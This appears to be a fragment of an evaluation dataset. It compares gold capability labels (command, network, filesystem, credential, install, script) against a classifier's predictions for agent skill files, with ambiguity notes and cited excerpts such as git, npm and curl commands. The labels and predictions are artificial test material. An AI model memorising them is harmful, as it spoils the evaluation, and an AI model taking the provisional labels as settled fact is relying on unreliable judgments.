+SCRIPT (No): No supporting excerpt identified.",000e7537949adcbd60c49e1723e55cc700a5a62f,widely_reused,None,"CMD, NET, FS"
+107,https://github.com/Jeeva0104/connector-service-mini/blob/HEAD/.claude/skills/makepad-event-action/SKILL.md,"NET, FS",None,No agreement,"NET: L18 candidate; distinguish remote operation from URL/reference or local command. FS: L42 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: None; FN: NET, FS","CMD (No): No supporting excerpt identified.
+NET (Yes): L18: > Check for updates: https://crates.io/crates/makepad-widgets
+FS (Yes): L41: 1. Read the relevant reference file(s) listed above
+L42: 2. If file read fails or file is empty:
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000e8285deb008f045370e2032535b0f4e605357,widely_reused,None,"NET, FS"
+108,https://github.com/darthlinuxer/Agentic-Skills/blob/HEAD/.claude/skills/game-design/SKILL.md,None,None,Exact agreement,L106: | Type | Example | — contextual reference or example may be mistaken for operational capability; inspect surrounding instructions. | Provisional FP: None; FN: None,"CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000ea7ca00eab7c77e8f3cf5ccd9f122bf5b27f1,widely_reused,None,None
+109,https://github.com/NVIDIA/DeepStream/blob/HEAD/skills/deepstream-profile-pipeline/SKILL.md,"CMD, FS",None,No agreement,"NET: L105 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. SCRIPT: L118 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SkillGuard prediction unavailable or recorded as None; verify original prediction before attributing an error. | Source SHA not in supplied key. | Provisional FP: None; FN: CMD, FS","CMD (Yes): L145: ```bash
+L179: `batch-size` to find the plateau. This isolates the model's true peak FPS from everything
+L232: ```bash
+NET (No): L88: | `nvstreammux.batched-push-timeout` | `1e6 / source_fps` µs (33333 for 30 fps) | — |
+L105: The student / API user never sees these knobs. The skill's response back to the user is in
+L207: `batched-push-timeout = 1e6 / source_fps` µs, `nvbuf-memory-type = 0`.
+FS (Yes): L118: - Read the pipeline definition (gst-launch string or `pipeline.py`).
+L222: Write the derived values into the user's config files (`pgie_config.yml`,
+L179: `batch-size` to find the plateau. This isolates the model's true peak FPS from everything
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L118: - Read the pipeline definition (gst-launch string or `pipeline.py`).
+L223: `tracker_config.yml`, `pipeline.py` source properties, any `deepstream-app` `.txt`). Always",000f6c7ecdf24a3f509a92a319922459cd02bca3,widely_reused,None,"CMD, FS"
+110,https://github.com/adriangmrraa/MultiAgents-Platform-ROI/blob/HEAD/.agent/skills/Skill_Sync/SKILL.md,FS,None,No agreement,NET: L25 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): L25: | **Sovereign Backend** | *Backend, API, DB* | Experto en FastAPI y Credenciales. |
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",001036f9b253ae31439bde78c8573b933c8a5f79,widely_reused,None,FS
+111,https://github.com/quickwit-oss/tantivy/blob/HEAD/.claude/skills/simple-pr/SKILL.md,"CMD, NET, FS","CMD, INST, SCRIPT",Partial agreement,"CMD: L17 is conditional/example-like; distinguish available capability from mandatory action. NET: L23 candidate; distinguish remote operation from URL/reference or local command. SkillGuard prediction unavailable or recorded as None; verify original prediction before attributing an error. | Source SHA not in supplied key. | Provisional FP: INST, SCRIPT; FN: NET, FS","CMD (Yes): L15: Run: `git status`
+L17: Verify that all changes have been staged (no unstaged changes). If there are unstaged changes, abort and ask the user to stage their changes first with `git add`.
+L23: Run: `git pull origin main`
+NET (Yes): L23: Run: `git pull origin main`
+L58: git push -u origin {branch-name}
+L54: ## Step 7: Push and open a PR
+FS (Yes): L15: Run: `git status`
+L29: Run: `git diff --cached`
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00107e1c46bee3a714adf4282e77f8f8bafeb0c5,widely_reused,"INST, SCRIPT","NET, FS"
+112,https://github.com/Endsi3g/M.Alfred-The-personal-assistant-of-Uprising-Studio-/blob/HEAD/modules/awesome_skills/skills/observe-whatsapp/SKILL.md,"CMD, NET, CRED, SCRIPT",None,No agreement,"NET: L5 candidate; distinguish remote operation from URL/reference or local command. FS: L29 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. INST: L73 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L27 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: CMD, NET, CRED, SCRIPT","CMD (Yes): L27: 1. List messages: `node scripts/messages.js --phone-number-id <id>`
+L28: 2. Inspect message: `node scripts/message-details.js --message-id <id>`
+L29: 3. Find conversation: `node scripts/lookup-conversation.js --phone-number <e164>`
+NET (Yes): L5: description: ""Observe and troubleshoot WhatsApp in Kapso: debug message delivery, inspect webhook deliveries/retries, triage API errors, and run health checks. Use when investigating production issues, message f...""
+L34: 2. API logs: `node scripts/api-logs.js`
+L7: source: ""https://github.com/gokapso/agent-skills/tree/master/skills/observe-whatsapp""
+FS (No): L29: 3. Find conversation: `node scripts/lookup-conversation.js --phone-number <e164>`
+L50: | `lookup-conversation.js` | Find conversation by phone or ID |
+CRED (Yes): No supporting excerpt identified.
+INST (No): L73: Install deps (once):
+SCRIPT (Yes): L27: 1. List messages: `node scripts/messages.js --phone-number-id <id>`
+L28: 2. Inspect message: `node scripts/message-details.js --message-id <id>`
+L29: 3. Find conversation: `node scripts/lookup-conversation.js --phone-number <e164>`",0010b24cac2e7b099885c96260d9611837f74a97,widely_reused,None,"CMD, NET, CRED, SCRIPT"
+113,https://github.com/0xAidan/polymarket-bot-test/blob/HEAD/.cursor/skills/formatting-insight-axes/SKILL.md,NET,None,No agreement,No specific ambiguity documented; absence of evidence does not establish absence of capability. | Provisional FP: None; FN: NET,"CMD (No): No supporting excerpt identified.
+NET (Yes): No supporting excerpt identified.
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00110abde4bd2176d08c7212fcf4b635e724998f,widely_reused,None,NET
+114,https://github.com/Yash000/9tattvas/blob/HEAD/.claude/skills/python-performance-optimization/SKILL.md,FS,None,No agreement,CMD: L5 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. FS: L37 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: None; FN: FS,"CMD (No): L5: description: ""Profile and optimize Python code using cProfile, memory profilers, and performance best practices. Use when debugging slow Python code, optimizing bottlenecks, or improving application performance.""
+L11: # Python Performance Optimization
+L13: Comprehensive guide to profiling, analyzing, and optimizing Python code for better performance, including CPU profiling, memory optimization, and implementation best practices.
+NET (No): No supporting excerpt identified.
+FS (Yes): L37: - If detailed examples are required, open `resources/implementation-playbook.md`.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00111ac71c6621b29bde96496f91bc1cc65585e1,widely_reused,None,FS
+115,https://github.com/PackmindHub/coding-agents-matrix/blob/HEAD/.claude/skills/add-agent-property/SKILL.md,FS,None,No agreement,SCRIPT: L60 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (Yes): L25: ### 2. Update agents-detailed.json
+L38: ### 3. Update groups.json
+L81: **01-update-agent.md** - Add under Features section:
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L60: ### 5. Update useAgentsData.js
+L62: Add transformation in `src/hooks/useAgentsData.js`:
+L96: - [ ] Transformation added to useAgentsData.js",0011c35a26545cbd52fd5d4cbf00831529c57f60,widely_reused,None,FS
+116,https://github.com/gabrielmoreira/agent-skills-mirror/blob/HEAD/mirrors/repos/microsoft@skills/.github/plugins/azure-sdk-typescript/skills/m365-agents-ts/SKILL.md,"CMD, NET, CRED, INST","CMD, CRED, INST",Partial agreement,NET: L20 candidate; distinguish remote operation from URL/reference or local command. CRED: L40 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. INST: L26 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L6 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: NET,"CMD (Yes): L21: - Confirm package versions on npm before wiring up samples or templates.
+L26: npm install @microsoft/agents-hosting @microsoft/agents-hosting-express @microsoft/agents-activity
+L27: npm install @microsoft/agents-copilotstudio-client
+NET (Yes): L20: - Use the microsoft-docs MCP to verify the latest API signatures for AgentApplication, startServer, and CopilotStudioClient.
+L89: type: ""https://schema.org/Message"",
+L193: | Microsoft 365 Agents SDK               | https://learn.microsoft.com/en-us/microsoft-365/agents-sdk/                                                         |
+FS (No): No supporting excerpt identified.
+CRED (Yes): L40: CLIENT_SECRET=<client-secret>
+INST (Yes): L26: npm install @microsoft/agents-hosting @microsoft/agents-hosting-express @microsoft/agents-activity
+L27: npm install @microsoft/agents-copilotstudio-client
+L23: ## Installation
+SCRIPT (No): L6: Microsoft 365 Agents SDK for TypeScript/Node.js. Build multichannel agents for Teams/M365/Copilot Studio with AgentApplication routing, Express hosting, streaming responses, and Copilot Studio client integration. Triggers: ""Microsoft 365 Agents SDK"", ""@microsoft/agents-hosting"", ""AgentApplication"",",00169cce10c70508375fc9300513a7600c7f75f8,widely_reused,None,NET
+117,https://github.com/wallacedobbs428/thecalltaker/blob/HEAD/.claude/skills/ultraqa/SKILL.md,"CMD, FS","CMD, FS",Exact agreement,FS: L125 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. | Provisional FP: None; FN: None,"CMD (Yes): L38: - `--tests`: Run the project's test command
+L39: - `--build`: Run the project's build command
+L40: - `--lint`: Run the project's lint command
+NET (No): No supporting excerpt identified.
+FS (Yes): L125: **IMPORTANT: Delete state files on completion - do NOT just set `active: false`**
+L130: # Delete ultraqa state file
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0016ccf8daf5f22c4569248a57226f2eae104e47,widely_reused,None,None
+118,https://github.com/storm-software/action-dependabot-approve/blob/HEAD/.github/skills/nx-generate/SKILL.md,"CMD, FS","CMD, INST",Partial agreement,FS: L90 is conditional/example-like; distinguish available capability from mandatory action. INST: L127 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. SCRIPT: L91 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: INST; FN: FS,"CMD (Yes): L74: - Required for npm publishing
+L89: - For plugin generators: Use `node -e ""console.log(require.resolve('@nx/<plugin>/generators.json'));""` to find the generators.json, then locate the source from there
+L122: npx nx g @nx/react:library --name=my-lib --dry-run --no-interactive
+NET (No): No supporting excerpt identified.
+FS (Yes): L89: - For plugin generators: Use `node -e ""console.log(require.resolve('@nx/<plugin>/generators.json'));""` to find the generators.json, then locate the source from there
+L90: - If that fails, read directly from `node_modules/<plugin>/generators.json`
+L147: **Important:** If you replace or delete generated test files (e.g., `*.spec.ts`), either write meaningful replacement tests or remove the `test` target from the project configuration. Empty test suites will cause `nx test` to fail.
+CRED (No): No supporting excerpt identified.
+INST (No): L122: npx nx g @nx/react:library --name=my-lib --dry-run --no-interactive
+L127: Note: Some generators don't support dry-run (e.g., if they install npm packages). If dry-run fails for this reason, proceed to running the generator for real.
+L32: - List all generators for a plugin: `npx nx list @nx/react`
+SCRIPT (No): L91: - For local generators: Typically in `tools/generators/` or a local plugin directory. Search the repo for the generator name.",001a76fc8af2da72369e2b25930b73a2ae2ff1f1,widely_reused,INST,FS
+119,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/canonical-data-map/SKILL.md,"CMD, FS","CMD, FS, CRED",Partial agreement,NET: L8 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. FS: L629 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. CRED: L700 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CRED; FN: None,"CMD (Yes): L20: ```bash
+L25: mkdir -p $OPENCLAW_DATA_DIR/{incoming/{invoices,receipts,statements,government},processing,clients,compliance/{vat,efka,mydata,e1,e3},banking/{imports/{alpha,nbg,eurobank,piraeus},processing,reconciliation},ocr/{incoming,output},reports,auth,system/{logs,process-locks},backups}
+NET (No): L8: homepage: https://github.com/satoshistackalotto/openclaw-greek-accounting
+L60: All documents entering the system land here first, regardless of source (email attachment, manual drop, scanner, bank download). Nothing in `/data/incoming/` is processed yet.
+L568: | `/data/email-attachments` | `/data/incoming/` (classified) |
+FS (Yes): L607: | `/data/system/integrity/` | `system-integrity-and-backup` | All skills write hash on canonical file write |
+L629: 10. **Deprecated paths are read-only legacy** — redirect to canonical paths, never create new files at deprecated locations.
+L25: mkdir -p $OPENCLAW_DATA_DIR/{incoming/{invoices,receipts,statements,government},processing,clients,compliance/{vat,efka,mydata,e1,e3},banking/{imports/{alpha,nbg,eurobank,piraeus},processing,reconciliation},ocr/{incoming,output},reports,auth,system/{logs,process-locks},backups}
+CRED (No): L700: | `/data/auth/` | Restricted | **Mandatory** | Credential hashes, session data, 2FA secrets |
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",001b25ea8bd4f939c43e9ddf01f5f8d5aa40bab4,widely_reused,CRED,None
+120,https://github.com/Brmbobo/Web2podcast/blob/HEAD/.claude/agents/enterprise-frontend-design/agents/saas-packs/windsurf-pack/skills/windsurf-common-errors/SKILL.md,"CMD, NET, CRED","CMD, NET, CRED",Exact agreement,NET: L93 candidate; distinguish remote operation from URL/reference or local command. FS: L32 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. CRED: L48 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. | Provisional FP: None; FN: None,"CMD (Yes): L93: curl -s https://status.windsurf.com
+L96: curl -I https://api.windsurf.com
+L32: ### Step 2: Find Matching Error Below
+NET (Yes): L93: curl -s https://status.windsurf.com
+L96: curl -I https://api.windsurf.com
+L24: - API credentials configured
+FS (No): L32: ### Step 2: Find Matching Error Below
+CRED (Yes): L48: Authentication error: Invalid API key
+L51: **Cause:** API key is missing, expired, or invalid.
+L55: # Verify API key is set
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",001baca70496e04c9c1f7312207cc5f51810e9f7,widely_reused,None,None
